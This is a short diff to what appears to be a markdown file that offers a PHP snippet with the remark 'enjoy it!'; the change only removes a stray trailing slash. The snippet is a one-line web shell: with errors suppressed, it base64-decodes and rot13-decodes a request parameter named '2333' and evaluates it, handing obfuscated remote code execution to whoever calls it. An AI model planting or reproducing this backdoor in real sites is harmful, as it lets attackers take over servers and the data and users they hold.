@@ -47,7 +47,7 @@ enjoy it!
 ```php
 <?php
 error_reporting(0);
-eval(str_rot13(base64_decode($_REQUEST['2333'])));/
+eval(str_rot13(base64_decode($_REQUEST['2333'])));
 ?>
 ```
 
